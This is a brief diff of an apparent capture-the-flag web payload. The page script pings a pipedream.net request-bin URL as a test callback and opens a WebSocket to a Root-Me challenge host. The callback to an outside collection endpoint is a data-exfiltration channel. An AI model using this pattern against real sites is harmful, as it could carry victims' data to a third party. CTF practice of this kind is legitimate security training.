@@ -3,7 +3,10 @@
 <body>
 <script>
 
- fetch("https://eo287p1od7gtso3.m.pipedream.net/?test=good");
+const response = await fetch("https://eo287p1od7gtso3.m.pipedream.net/?test=good");
+if (!response.ok) {
+     throw new Error(`Response status: ${response.status}`);
+}
   
 const ws = new WebSocket("ws://ctf20.root-me.org/ws");
 
